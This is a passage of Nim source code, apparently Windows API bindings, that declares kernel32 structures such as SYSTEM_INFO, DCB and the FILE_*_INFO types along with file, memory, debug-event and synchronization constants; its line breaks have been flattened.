PROC_THREAD_ATTRIBUTE_LIST  SRWLOCK* = RTL_SRWLOCK  PSRWLOCK* = ptr RTL_SRWLOCK  INIT_ONCE* = RTL_RUN_ONCE  PINIT_ONCE* = PRTL_RUN_ONCE  LPINIT_ONCE* = PRTL_RUN_ONCE  CONDITION_VARIABLE* = RTL_CONDITION_VARIABLE  PCONDITION_VARIABLE* = ptr RTL_CONDITION_VARIABLE  SYNCHRONIZATION_BARRIER* = RTL_BARRIER  PSYNCHRONIZATION_BARRIER* = PRTL_BARRIER  LPSYNCHRONIZATION_BARRIER* = PRTL_BARRIER  SYSTEM_INFO_UNION1_STRUCT1* {.pure.} = object    wProcessorArchitecture*: WORD    wReserved*: WORD  SYSTEM_INFO_UNION1* {.pure, union.} = object    dwOemId*: DWORD    struct1*: SYSTEM_INFO_UNION1_STRUCT1  SYSTEM_INFO* {.pure.} = object    union1*: SYSTEM_INFO_UNION1    dwPageSize*: DWORD    lpMinimumApplicationAddress*: LPVOID    lpMaximumApplicationAddress*: LPVOID    dwActiveProcessorMask*: DWORD_PTR    dwNumberOfProcessors*: DWORD    dwProcessorType*: DWORD    dwAllocationGranularity*: DWORD    wProcessorLevel*: WORD    wProcessorRevision*: WORD  LPSYSTEM_INFO* = ptr SYSTEM_INFO  MEMORYSTATUSEX* {.pure.} = object    dwLength*: DWORD    dwMemoryLoad*: DWORD    ullTotalPhys*: DWORDLONG    ullAvailPhys*: DWORDLONG    ullTotalPageFile*: DWORDLONG    ullAvailPageFile*: DWORDLONG    ullTotalVirtual*: DWORDLONG    ullAvailVirtual*: DWORDLONG    ullAvailExtendedVirtual*: DWORDLONG  LPMEMORYSTATUSEX* = ptr MEMORYSTATUSEX  PFIBER_START_ROUTINE* = proc (lpFiberParameter: LPVOID): VOID {.stdcall.}  LPFIBER_START_ROUTINE* = PFIBER_START_ROUTINE  COMMPROP* {.pure.} = object    wPacketLength*: WORD    wPacketVersion*: WORD    dwServiceMask*: DWORD    dwReserved1*: DWORD    dwMaxTxQueue*: DWORD    dwMaxRxQueue*: DWORD    dwMaxBaud*: DWORD    dwProvSubType*: DWORD    dwProvCapabilities*: DWORD    dwSettableParams*: DWORD    dwSettableBaud*: DWORD    wSettableData*: WORD    wSettableStopParity*: WORD    dwCurrentTxQueue*: DWORD    dwCurrentRxQueue*: DWORD    dwProvSpec1*: DWORD    dwProvSpec2*: DWORD    wcProvChar*: array[1, WCHAR]  LPCOMMPROP* = ptr COMMPROP  COMSTAT* {.pure.} = object    fCtsHold* {.bitsize:1.}: DWORD    fDsrHold* {.bitsize:1.}: DWORD    fRlsdHold* {.bitsize:1.}: DWORD    fXoffHold* {.bitsize:1.}: DWORD    fXoffSent* {.bitsize:1.}: DWORD    fEof* {.bitsize:1.}: DWORD    fTxim* {.bitsize:1.}: DWORD    fReserved* {.bitsize:25.}: DWORD    cbInQue*: DWORD    cbOutQue*: DWORD  LPCOMSTAT* = ptr COMSTAT  DCB* {.pure.} = object    DCBlength*: DWORD    BaudRate*: DWORD    fBinary* {.bitsize:1.}: DWORD    fParity* {.bitsize:1.}: DWORD    fOutxCtsFlow* {.bitsize:1.}: DWORD    fOutxDsrFlow* {.bitsize:1.}: DWORD    fDtrControl* {.bitsize:2.}: DWORD    fDsrSensitivity* {.bitsize:1.}: DWORD    fTXContinueOnXoff* {.bitsize:1.}: DWORD    fOutX* {.bitsize:1.}: DWORD    fInX* {.bitsize:1.}: DWORD    fErrorChar* {.bitsize:1.}: DWORD    fNull* {.bitsize:1.}: DWORD    fRtsControl* {.bitsize:2.}: DWORD    fAbortOnError* {.bitsize:1.}: DWORD    fDummy2* {.bitsize:17.}: DWORD    wReserved*: WORD    XonLim*: WORD    XoffLim*: WORD    ByteSize*: BYTE    Parity*: BYTE    StopBits*: BYTE    XonChar*: char    XoffChar*: char    ErrorChar*: char    EofChar*: char    EvtChar*: char    wReserved1*: WORD  LPDCB* = ptr DCB  COMMTIMEOUTS* {.pure.} = object    ReadIntervalTimeout*: DWORD    ReadTotalTimeoutMultiplier*: DWORD    ReadTotalTimeoutConstant*: DWORD    WriteTotalTimeoutMultiplier*: DWORD    WriteTotalTimeoutConstant*: DWORD  LPCOMMTIMEOUTS* = ptr COMMTIMEOUTS  COMMCONFIG* {.pure.} = object    dwSize*: DWORD    wVersion*: WORD    wReserved*: WORD    dcb*: DCB    dwProviderSubType*: DWORD    dwProviderOffset*: DWORD    dwProviderSize*: DWORD    wcProviderData*: array[1, WCHAR]  LPCOMMCONFIG* = ptr COMMCONFIG  MEMORYSTATUS* {.pure.} = object    dwLength*: DWORD    dwMemoryLoad*: DWORD    dwTotalPhys*: SIZE_T    dwAvailPhys*: SIZE_T    dwTotalPageFile*: SIZE_T    dwAvailPageFile*: SIZE_T    dwTotalVirtual*: SIZE_T    dwAvailVirtual*: SIZE_T  LPMEMORYSTATUS* = ptr MEMORYSTATUS  JIT_DEBUG_INFO* {.pure.} = object    dwSize*: DWORD    dwProcessorArchitecture*: DWORD    dwThreadID*: DWORD    dwReserved0*: DWORD    lpExceptionAddress*: ULONG64    lpExceptionRecord*: ULONG64    lpContextRecord*: ULONG64  LPJIT_DEBUG_INFO* = ptr JIT_DEBUG_INFO  JIT_DEBUG_INFO32* = JIT_DEBUG_INFO  LPJIT_DEBUG_INFO32* = ptr JIT_DEBUG_INFO  JIT_DEBUG_INFO64* = JIT_DEBUG_INFO  LPJIT_DEBUG_INFO64* = ptr JIT_DEBUG_INFO  LPEXCEPTION_RECORD* = PEXCEPTION_RECORD  LPEXCEPTION_POINTERS* = PEXCEPTION_POINTERSconst  OFS_MAXPATHNAME* = 128type  OFSTRUCT* {.pure.} = object    cBytes*: BYTE    fFixedDisk*: BYTE    nErrCode*: WORD    Reserved1*: WORD    Reserved2*: WORD    szPathName*: array[OFS_MAXPATHNAME, CHAR]  LPOFSTRUCT* = ptr OFSTRUCT  POFSTRUCT* = ptr OFSTRUCT  MEMORY_PRIORITY_INFORMATION* {.pure.} = object    MemoryPriority*: ULONG  PMEMORY_PRIORITY_INFORMATION* = ptr MEMORY_PRIORITY_INFORMATION  POWER_REQUEST_CONTEXT* = REASON_CONTEXT  PPOWER_REQUEST_CONTEXT* = ptr REASON_CONTEXT  LPPOWER_REQUEST_CONTEXT* = ptr REASON_CONTEXT  WIN32_STREAM_ID* {.pure.} = object    dwStreamId*: DWORD    dwStreamAttributes*: DWORD    Size*: LARGE_INTEGER    dwStreamNameSize*: DWORD    cStreamName*: array[ANYSIZE_ARRAY, WCHAR]  LPWIN32_STREAM_ID* = ptr WIN32_STREAM_ID  STARTUPINFOEXA* {.pure.} = object    StartupInfo*: STARTUPINFOA    lpAttributeList*: LPPROC_THREAD_ATTRIBUTE_LIST  LPSTARTUPINFOEXA* = ptr STARTUPINFOEXA  STARTUPINFOEXW* {.pure.} = object    StartupInfo*: STARTUPINFOW    lpAttributeList*: LPPROC_THREAD_ATTRIBUTE_LIST  LPSTARTUPINFOEXW* = ptr STARTUPINFOEXW  WIN32_FIND_STREAM_DATA* {.pure.} = object    StreamSize*: LARGE_INTEGER    cStreamName*: array[MAX_PATH + 36, WCHAR]  PWIN32_FIND_STREAM_DATA* = ptr WIN32_FIND_STREAM_DATA  EVENTLOG_FULL_INFORMATION* {.pure.} = object    dwFull*: DWORD  LPEVENTLOG_FULL_INFORMATION* = ptr EVENTLOG_FULL_INFORMATION  OPERATION_START_PARAMETERS* {.pure.} = object    Version*: ULONG    OperationId*: OPERATION_ID    Flags*: ULONG  POPERATION_START_PARAMETERS* = ptr OPERATION_START_PARAMETERS  OPERATION_END_PARAMETERS* {.pure.} = object    Version*: ULONG    OperationId*: OPERATION_ID    Flags*: ULONG  POPERATION_END_PARAMETERS* = ptr OPERATION_END_PARAMETERSconst  HW_PROFILE_GUIDLEN* = 39  MAX_PROFILE_LEN* = 80type  HW_PROFILE_INFOA* {.pure.} = object    dwDockInfo*: DWORD    szHwProfileGuid*: array[HW_PROFILE_GUIDLEN, CHAR]    szHwProfileName*: array[MAX_PROFILE_LEN, CHAR]  LPHW_PROFILE_INFOA* = ptr HW_PROFILE_INFOA  HW_PROFILE_INFOW* {.pure.} = object    dwDockInfo*: DWORD    szHwProfileGuid*: array[HW_PROFILE_GUIDLEN, WCHAR]    szHwProfileName*: array[MAX_PROFILE_LEN, WCHAR]  LPHW_PROFILE_INFOW* = ptr HW_PROFILE_INFOW  TIME_ZONE_INFORMATION* {.pure.} = object    Bias*: LONG    StandardName*: array[32, WCHAR]    StandardDate*: SYSTEMTIME    StandardBias*: LONG    DaylightName*: array[32, WCHAR]    DaylightDate*: SYSTEMTIME    DaylightBias*: LONG  PTIME_ZONE_INFORMATION* = ptr TIME_ZONE_INFORMATION  LPTIME_ZONE_INFORMATION* = ptr TIME_ZONE_INFORMATION  DYNAMIC_TIME_ZONE_INFORMATION* {.pure.} = object    Bias*: LONG    StandardName*: array[32, WCHAR]    StandardDate*: SYSTEMTIME    StandardBias*: LONG    DaylightName*: array[32, WCHAR]    DaylightDate*: SYSTEMTIME    DaylightBias*: LONG    TimeZoneKeyName*: array[128, WCHAR]    DynamicDaylightTimeDisabled*: BOOLEAN  PDYNAMIC_TIME_ZONE_INFORMATION* = ptr DYNAMIC_TIME_ZONE_INFORMATION  SYSTEM_POWER_STATUS* {.pure.} = object    ACLineStatus*: BYTE    BatteryFlag*: BYTE    BatteryLifePercent*: BYTE    Reserved1*: BYTE    BatteryLifeTime*: DWORD    BatteryFullLifeTime*: DWORD  LPSYSTEM_POWER_STATUS* = ptr SYSTEM_POWER_STATUS  PBAD_MEMORY_CALLBACK_ROUTINE* = ptr BAD_MEMORY_CALLBACK_ROUTINE  ACTCTXA* {.pure.} = object    cbSize*: ULONG    dwFlags*: DWORD    lpSource*: LPCSTR    wProcessorArchitecture*: USHORT    wLangId*: LANGID    lpAssemblyDirectory*: LPCSTR    lpResourceName*: LPCSTR    lpApplicationName*: LPCSTR    hModule*: HMODULE  PACTCTXA* = ptr ACTCTXA  ACTCTXW* {.pure.} = object    cbSize*: ULONG    dwFlags*: DWORD    lpSource*: LPCWSTR    wProcessorArchitecture*: USHORT    wLangId*: LANGID    lpAssemblyDirectory*: LPCWSTR    lpResourceName*: LPCWSTR    lpApplicationName*: LPCWSTR    hModule*: HMODULE  PACTCTXW* = ptr ACTCTXW  PCACTCTXA* = ptr ACTCTXA  PCACTCTXW* = ptr ACTCTXW  ACTCTX_SECTION_KEYED_DATA_2600* {.pure.} = object    cbSize*: ULONG    ulDataFormatVersion*: ULONG    lpData*: PVOID    ulLength*: ULONG    lpSectionGlobalData*: PVOID    ulSectionGlobalDataLength*: ULONG    lpSectionBase*: PVOID    ulSectionTotalLength*: ULONG    hActCtx*: HANDLE    ulAssemblyRosterIndex*: ULONG  PACTCTX_SECTION_KEYED_DATA_2600* = ptr ACTCTX_SECTION_KEYED_DATA_2600  PCACTCTX_SECTION_KEYED_DATA_2600* = ptr ACTCTX_SECTION_KEYED_DATA_2600  ACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA* {.pure.} = object    lpInformation*: PVOID    lpSectionBase*: PVOID    ulSectionLength*: ULONG    lpSectionGlobalDataBase*: PVOID    ulSectionGlobalDataLength*: ULONG  PACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA* = ptr ACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA  PCACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA* = ptr ACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA  ACTCTX_SECTION_KEYED_DATA* {.pure.} = object    cbSize*: ULONG    ulDataFormatVersion*: ULONG    lpData*: PVOID    ulLength*: ULONG    lpSectionGlobalData*: PVOID    ulSectionGlobalDataLength*: ULONG    lpSectionBase*: PVOID    ulSectionTotalLength*: ULONG    hActCtx*: HANDLE    ulAssemblyRosterIndex*: ULONG    ulFlags*: ULONG    AssemblyMetadata*: ACTCTX_SECTION_KEYED_DATA_ASSEMBLY_METADATA  PACTCTX_SECTION_KEYED_DATA* = ptr ACTCTX_SECTION_KEYED_DATA  PCACTCTX_SECTION_KEYED_DATA* = ptr ACTCTX_SECTION_KEYED_DATA  ACTIVATION_CONTEXT_BASIC_INFORMATION* {.pure.} = object    hActCtx*: HANDLE    dwFlags*: DWORD  PACTIVATION_CONTEXT_BASIC_INFORMATION* = ptr ACTIVATION_CONTEXT_BASIC_INFORMATION  PCACTIVATION_CONTEXT_BASIC_INFORMATION* = ptr ACTIVATION_CONTEXT_BASIC_INFORMATION  FILE_BASIC_INFO* {.pure.} = object    CreationTime*: LARGE_INTEGER    LastAccessTime*: LARGE_INTEGER    LastWriteTime*: LARGE_INTEGER    ChangeTime*: LARGE_INTEGER    FileAttributes*: DWORD  PFILE_BASIC_INFO* = ptr FILE_BASIC_INFO  FILE_STANDARD_INFO* {.pure.} = object    AllocationSize*: LARGE_INTEGER    EndOfFile*: LARGE_INTEGER    NumberOfLinks*: DWORD    DeletePending*: BOOLEAN    Directory*: BOOLEAN  PFILE_STANDARD_INFO* = ptr FILE_STANDARD_INFO  FILE_NAME_INFO* {.pure.} = object    FileNameLength*: DWORD    FileName*: array[1, WCHAR]  PFILE_NAME_INFO* = ptr FILE_NAME_INFO  FILE_RENAME_INFO* {.pure.} = object    ReplaceIfExists*: BOOLEAN    RootDirectory*: HANDLE    FileNameLength*: DWORD    FileName*: array[1, WCHAR]  PFILE_RENAME_INFO* = ptr FILE_RENAME_INFO  FILE_ALLOCATION_INFO* {.pure.} = object    AllocationSize*: LARGE_INTEGER  PFILE_ALLOCATION_INFO* = ptr FILE_ALLOCATION_INFO  FILE_END_OF_FILE_INFO* {.pure.} = object    EndOfFile*: LARGE_INTEGER  PFILE_END_OF_FILE_INFO* = ptr FILE_END_OF_FILE_INFO  FILE_STREAM_INFO* {.pure.} = object    NextEntryOffset*: DWORD    StreamNameLength*: DWORD    StreamSize*: LARGE_INTEGER    StreamAllocationSize*: LARGE_INTEGER    StreamName*: array[1, WCHAR]  PFILE_STREAM_INFO* = ptr FILE_STREAM_INFO  FILE_COMPRESSION_INFO* {.pure.} = object    CompressedFileSize*: LARGE_INTEGER    CompressionFormat*: WORD    CompressionUnitShift*: UCHAR    ChunkShift*: UCHAR    ClusterShift*: UCHAR    Reserved*: array[3, UCHAR]  PFILE_COMPRESSION_INFO* = ptr FILE_COMPRESSION_INFO  FILE_ATTRIBUTE_TAG_INFO* {.pure.} = object    FileAttributes*: DWORD    ReparseTag*: DWORD  PFILE_ATTRIBUTE_TAG_INFO* = ptr FILE_ATTRIBUTE_TAG_INFO  FILE_DISPOSITION_INFO* {.pure.} = object    DeleteFile*: BOOLEAN  PFILE_DISPOSITION_INFO* = ptr FILE_DISPOSITION_INFO  FILE_ID_BOTH_DIR_INFO* {.pure.} = object    NextEntryOffset*: DWORD    FileIndex*: DWORD    CreationTime*: LARGE_INTEGER    LastAccessTime*: LARGE_INTEGER    LastWriteTime*: LARGE_INTEGER    ChangeTime*: LARGE_INTEGER    EndOfFile*: LARGE_INTEGER    AllocationSize*: LARGE_INTEGER    FileAttributes*: DWORD    FileNameLength*: DWORD    EaSize*: DWORD    ShortNameLength*: CCHAR    ShortName*: array[12, WCHAR]    FileId*: LARGE_INTEGER    FileName*: array[1, WCHAR]  PFILE_ID_BOTH_DIR_INFO* = ptr FILE_ID_BOTH_DIR_INFO  FILE_FULL_DIR_INFO* {.pure.} = object    NextEntryOffset*: ULONG    FileIndex*: ULONG    CreationTime*: LARGE_INTEGER    LastAccessTime*: LARGE_INTEGER    LastWriteTime*: LARGE_INTEGER    ChangeTime*: LARGE_INTEGER    EndOfFile*: LARGE_INTEGER    AllocationSize*: LARGE_INTEGER    FileAttributes*: ULONG    FileNameLength*: ULONG    EaSize*: ULONG    FileName*: array[1, WCHAR]  PFILE_FULL_DIR_INFO* = ptr FILE_FULL_DIR_INFO  FILE_IO_PRIORITY_HINT_INFO* {.pure.} = object    PriorityHint*: PRIORITY_HINT  PFILE_IO_PRIORITY_HINT_INFO* = ptr FILE_IO_PRIORITY_HINT_INFO  FILE_ALIGNMENT_INFO* {.pure.} = object    AlignmentRequirement*: ULONG  PFILE_ALIGNMENT_INFO* = ptr FILE_ALIGNMENT_INFO  FILE_STORAGE_INFO* {.pure.} = object    LogicalBytesPerSector*: ULONG    PhysicalBytesPerSectorForAtomicity*: ULONG    PhysicalBytesPerSectorForPerformance*: ULONG    FileSystemEffectivePhysicalBytesPerSectorForAtomicity*: ULONG    Flags*: ULONG    ByteOffsetForSectorAlignment*: ULONG    ByteOffsetForPartitionAlignment*: ULONG  PFILE_STORAGE_INFO* = ptr FILE_STORAGE_INFO  FILE_ID_INFO* {.pure.} = object    VolumeSerialNumber*: ULONGLONG    FileId*: FILE_ID_128  PFILE_ID_INFO* = ptr FILE_ID_INFO  FILE_ID_EXTD_DIR_INFO* {.pure.} = object    NextEntryOffset*: ULONG    FileIndex*: ULONG    CreationTime*: LARGE_INTEGER    LastAccessTime*: LARGE_INTEGER    LastWriteTime*: LARGE_INTEGER    ChangeTime*: LARGE_INTEGER    EndOfFile*: LARGE_INTEGER    AllocationSize*: LARGE_INTEGER    FileAttributes*: ULONG    FileNameLength*: ULONG    EaSize*: ULONG    ReparsePointTag*: ULONG    FileId*: FILE_ID_128    FileName*: array[1, WCHAR]  PFILE_ID_EXTD_DIR_INFO* = ptr FILE_ID_EXTD_DIR_INFO  FILE_REMOTE_PROTOCOL_INFO_GenericReserved* {.pure.} = object    Reserved*: array[8, ULONG]  FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2_Server* {.pure.} = object    Capabilities*: ULONG  FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2_Share* {.pure.} = object    Capabilities*: ULONG    CachingFlags*: ULONG  FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2* {.pure.} = object    Server*: FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2_Server    Share*: FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2_Share  FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific* {.pure, union.} = object    Smb2*: FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific_Smb2    Reserved*: array[16, ULONG]  FILE_REMOTE_PROTOCOL_INFO* {.pure.} = object    StructureVersion*: USHORT    StructureSize*: USHORT    Protocol*: ULONG    ProtocolMajorVersion*: USHORT    ProtocolMinorVersion*: USHORT    ProtocolRevision*: USHORT    Reserved*: USHORT    Flags*: ULONG    GenericReserved*: FILE_REMOTE_PROTOCOL_INFO_GenericReserved    ProtocolSpecific*: FILE_REMOTE_PROTOCOL_INFO_ProtocolSpecific  PFILE_REMOTE_PROTOCOL_INFO* = ptr FILE_REMOTE_PROTOCOL_INFO  FILE_ID_DESCRIPTOR_UNION1* {.pure, union.} = object    FileId*: LARGE_INTEGER    ObjectId*: GUID    ExtendedFileId*: FILE_ID_128  FILE_ID_DESCRIPTOR* {.pure.} = object    dwSize*: DWORD    Type*: FILE_ID_TYPE    union1*: FILE_ID_DESCRIPTOR_UNION1  LPFILE_ID_DESCRIPTOR* = ptr FILE_ID_DESCRIPTORconst  findExInfoStandard* = 0  findExInfoBasic* = 1  findExInfoMaxInfoLevel* = 2  FIND_FIRST_EX_CASE_SENSITIVE* = 0x00000001  FIND_FIRST_EX_LARGE_FETCH* = 0x00000002  findExSearchNameMatch* = 0  findExSearchLimitToDirectories* = 1  findExSearchLimitToDevices* = 2  findExSearchMaxSearchOp* = 3  getFileExInfoStandard* = 0  getFileExMaxInfoLevel* = 1  fileBasicInfo* = 0  fileStandardInfo* = 1  fileNameInfo* = 2  fileRenameInfo* = 3  fileDispositionInfo* = 4  fileAllocationInfo* = 5  fileEndOfFileInfo* = 6  fileStreamInfo* = 7  fileCompressionInfo* = 8  fileAttributeTagInfo* = 9  fileIdBothDirectoryInfo* = 10  fileIdBothDirectoryRestartInfo* = 11  fileIoPriorityHintInfo* = 12  fileRemoteProtocolInfo* = 13  fileFullDirectoryInfo* = 14  fileFullDirectoryRestartInfo* = 15  fileStorageInfo* = 16  fileAlignmentInfo* = 17  fileIdInfo* = 18  fileIdExtdDirectoryInfo* = 19  fileIdExtdDirectoryRestartInfo* = 20  maximumFileInfoByHandleClass* = 21  LOCKFILE_FAIL_IMMEDIATELY* = 0x1  LOCKFILE_EXCLUSIVE_LOCK* = 0x2  PROCESS_HEAP_REGION* = 0x1  PROCESS_HEAP_UNCOMMITTED_RANGE* = 0x2  PROCESS_HEAP_ENTRY_BUSY* = 0x4  PROCESS_HEAP_ENTRY_MOVEABLE* = 0x10  PROCESS_HEAP_ENTRY_DDESHARE* = 0x20  EXCEPTION_DEBUG_EVENT* = 1  CREATE_THREAD_DEBUG_EVENT* = 2  CREATE_PROCESS_DEBUG_EVENT* = 3  EXIT_THREAD_DEBUG_EVENT* = 4  EXIT_PROCESS_DEBUG_EVENT* = 5  LOAD_DLL_DEBUG_EVENT* = 6  UNLOAD_DLL_DEBUG_EVENT* = 7  OUTPUT_DEBUG_STRING_EVENT* = 8  RIP_EVENT* = 9  STILL_ACTIVE* = STATUS_PENDING  EXCEPTION_ACCESS_VIOLATION* = STATUS_ACCESS_VIOLATION  EXCEPTION_DATATYPE_MISALIGNMENT* = STATUS_DATATYPE_MISALIGNMENT  EXCEPTION_BREAKPOINT* = STATUS_BREAKPOINT  EXCEPTION_SINGLE_STEP* = STATUS_SINGLE_STEP  EXCEPTION_ARRAY_BOUNDS_EXCEEDED* = STATUS_ARRAY_BOUNDS_EXCEEDED  EXCEPTION_FLT_DENORMAL_OPERAND* = STATUS_FLOAT_DENORMAL_OPERAND  EXCEPTION_FLT_DIVIDE_BY_ZERO* = STATUS_FLOAT_DIVIDE_BY_ZERO  EXCEPTION_FLT_INEXACT_RESULT* = STATUS_FLOAT_INEXACT_RESULT  EXCEPTION_FLT_INVALID_OPERATION* = STATUS_FLOAT_INVALID_OPERATION  EXCEPTION_FLT_OVERFLOW* = STATUS_FLOAT_OVERFLOW  EXCEPTION_FLT_STACK_CHECK* = STATUS_FLOAT_STACK_CHECK  EXCEPTION_FLT_UNDERFLOW* = STATUS_FLOAT_UNDERFLOW  EXCEPTION_INT_DIVIDE_BY_ZERO* = STATUS_INTEGER_DIVIDE_BY_ZERO  EXCEPTION_INT_OVERFLOW* = STATUS_INTEGER_OVERFLOW  EXCEPTION_PRIV_INSTRUCTION* = STATUS_PRIVILEGED_INSTRUCTION  EXCEPTION_IN_PAGE_ERROR* = STATUS_IN_PAGE_ERROR  EXCEPTION_ILLEGAL_INSTRUCTION* = STATUS_ILLEGAL_INSTRUCTION  EXCEPTION_NONCONTINUABLE_EXCEPTION* = STATUS_NONCONTINUABLE_EXCEPTION  EXCEPTION_STACK_OVERFLOW* = STATUS_STACK_OVERFLOW  EXCEPTION_INVALID_DISPOSITION* = STATUS_INVALID_DISPOSITION  EXCEPTION_GUARD_PAGE* = STATUS_GUARD_PAGE_VIOLATION  EXCEPTION_INVALID_HANDLE* = STATUS_INVALID_HANDLE  EXCEPTION_POSSIBLE_DEADLOCK* = STATUS_POSSIBLE_DEADLOCK  CONTROL_C_EXIT* = STATUS_CONTROL_C_EXIT  LMEM_FIXED* = 0x0  LMEM_MOVEABLE* = 0x2  LMEM_NOCOMPACT* = 0x10  LMEM_NODISCARD* = 0x20  LMEM_ZEROINIT* = 0x40  LMEM_MODIFY* = 0x80  LMEM_DISCARDABLE* = 0xf00  LMEM_VALID_FLAGS* = 0xf72  LMEM_INVALID_HANDLE* = 0x8000  LHND* = LMEM_MOVEABLE or LMEM_ZEROINIT  LPTR* = LMEM_FIXED or LMEM_ZEROINIT  NONZEROLHND* = LMEM_MOVEABLE  NONZEROLPTR* = LMEM_FIXED  LMEM_DISCARDED* = 0x4000  LMEM_LOCKCOUNT* = 0xff  RESTORE_LAST_ERROR_NAME_A* = "RestoreLastError"  RESTORE_LAST_ERROR_NAME_W* = "RestoreLastError"  RESTORE_LAST_ERROR_NAME* = "RestoreLastError"  FLS_OUT_OF_INDEXES* = DWORD 0xffffffff'i32  CREATE_NEW* = 1  CREATE_ALWAYS* = 2  OPEN_EXISTING* = 3  OPEN_ALWAYS* = 4  TRUNCATE_EXISTING* = 5  INVALID_FILE_SIZE* = DWORD 0xffffffff'i32  INVALID_SET_FILE_POINTER* = DWORD(-1)  INVALID_FILE_ATTRIBUTES* = DWORD(-1)  FIND_RESOURCE_DIRECTORY_TYPES* = 0x0100  FIND_RESOURCE_DIRECTORY_NAMES* = 0x0200  FIND_RESOURCE_DIRECTORY_LANGUAGES* = 0x0400  RESOURCE_ENUM_LN* = 0x0001  RESOURCE_ENUM_MUI* = 0x0002  RESOURCE_ENUM_MUI_SYSTEM* = 0x0004  RESOURCE_ENUM_VALIDATE* = 0x0008  RESOURCE_ENUM_MODULE_EXACT* = 0x0010  SUPPORT_LANG_NUMBER* = 32  DONT_RESOLVE_DLL_REFERENCES* = 0x1  LOAD_LIBRARY_AS_DATAFILE* = 0x2  LOAD_WITH_ALTERED_SEARCH_PATH* = 0x8  LOAD_IGNORE_CODE_AUTHZ_LEVEL* = 0x10  LOAD_LIBRARY_AS_IMAGE_RESOURCE* = 0x20  LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE* = 0x40  LOAD_LIBRARY_REQUIRE_SIGNED_TARGET* = 0x80  LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR* = 0x100  LOAD_LIBRARY_SEARCH_APPLICATION_DIR* = 0x200  LOAD_LIBRARY_SEARCH_USER_DIRS* = 0x400  LOAD_LIBRARY_SEARCH_SYSTEM32* = 0x800  LOAD_LIBRARY_SEARCH_DEFAULT_DIRS* = 0x1000  GET_MODULE_HANDLE_EX_FLAG_PIN* = 0x1  GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT* = 0x2  GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS* = 0x4  lowMemoryResourceNotification* = 0  highMemoryResourceNotification* = 1  vmOfferPriorityVeryLow* = 1  vmOfferPriorityLow* = 2  vmOfferPriorityBelowNormal* = 3  vmOfferPriorityNormal* = 4  FILE_MAP_WRITE* = SECTION_MAP_WRITE  FILE_MAP_READ* = SECTION_MAP_READ  FILE_MAP_ALL_ACCESS* = SECTION_ALL_ACCESS  FILE_MAP_COPY* = 0x1  FILE_MAP_RESERVE* = 0x80000000'i32  FILE_MAP_EXECUTE* = SECTION_MAP_EXECUTE_EXPLICIT  FILE_CACHE_MAX_HARD_ENABLE* = 0x00000001  FILE_CACHE_MAX_HARD_DISABLE* = 0x00000002  FILE_CACHE_MIN_HARD_ENABLE* = 0x00000004  FILE_CACHE_MIN_HARD_DISABLE* = 0x00000008  PRIVATE_NAMESPACE_FLAG_DESTROY* = 0x1  TLS_OUT_OF_INDEXES* = DWORD 0xffffffff'i32  PROCESS_AFFINITY_ENABLE_AUTO_UPDATE* = 0x1  PROC_THREAD_ATTRIBUTE_REPLACE_VALUE* = 0x00000001  SRWLOCK_INIT* = RTL_SRWLOCK_INIT  INIT_ONCE_STATIC_INIT* = RTL_RUN_ONCE_INIT  INIT_ONCE_CHECK_ONLY* = RTL_RUN_ONCE_CHECK_ONLY  INIT_ONCE_ASYNC* = RTL_RUN_ONCE_ASYNC  INIT_ONCE_INIT_FAILED* = RTL_RUN_ONCE_INIT_FAILED  INIT_ONCE_CTX_RESERVED_BITS* = RTL_RUN_ONCE_CTX_RESERVED_BITS  CONDITION_VARIABLE_INIT* = RTL_CONDITION_VARIABLE_INIT  CONDITION_VARIABLE_LOCKMODE_SHARED* = RTL_CONDITION_VARIABLE_LOCKMODE_SHARED  MUTEX_MODIFY_STATE* = MUTANT_QUERY_STATE  MUTEX_ALL_ACCESS* = MUTANT_ALL_ACCESS  CREATE_MUTEX_INITIAL_OWNER* = 0x1  CREATE_EVENT_MANUAL_RESET* = 0x1  CREATE_EVENT_INITIAL_SET* = 0x2  SYNCHRONIZATION_BARRIER_FLAGS_SPIN_ONLY* = 0x01  SYNCHRONIZATION_BARRIER_FLAGS_BLOCK_ONLY* = 0x02  SYNCHRONIZATION_BARRIER_FLAGS_NO_DELETE* = 0x04  CREATE_WAITABLE_TIMER_MANUAL_RESET* = 0x1  computerNameNetBIOS* = 0  computerNameDnsHostname* = 1  computerNameDnsDomain* = 2  computerNameDnsFullyQualified* = 3  computerNamePhysicalNetBIOS* = 4  computerNamePhysicalDnsHostname* = 5  computerNamePhysicalDnsDomain* = 6  computerNamePhysicalDnsFullyQualified* = 7  computerNameMax* = 8  FILE_BEGIN* = 0  FILE_CURRENT* = 1  FILE_END* = 2  WAIT_FAILED* = DWORD 0xffffffff'i32  WAIT_OBJECT_0* = (STATUS_WAIT_0)+0  WAIT_ABANDONED* = (STATUS_ABANDONED_WAIT_0)+0  WAIT_ABANDONED_0* = (STATUS_ABANDONED_WAIT_0)+0  WAIT_IO_COMPLETION* = STATUS_USER_APC  FILE_FLAG_WRITE_THROUGH* = 0x80000000'i32  FILE_FLAG_OVERLAPPED* = 0x40000000  FILE_FLAG_NO_BUFFERING* = 0x20000000  FILE_FLAG_RANDOM_ACCESS* = 0x10000000  FILE_FLAG_SEQUENTIAL_SCAN* = 0x8000000  FILE_FLAG_DELETE_ON_CLOSE* = 0x4000000  FILE_FLAG_BACKUP_SEMANTICS* = 0x2000000  FILE_FLAG_POSIX_SEMANTICS* = 0x1000000  FILE_FLAG_SESSION_AWARE* = 0x800000  FILE_FLAG_OPEN_REPARSE_POINT* = 0x200000  FILE_FLAG_OPEN_NO_RECALL* = 0x100000  FILE_FLAG_FIRST_PIPE_INSTANCE* = 0x80000  FILE_FLAG_OPEN_REQUIRING_OPLOCK* = 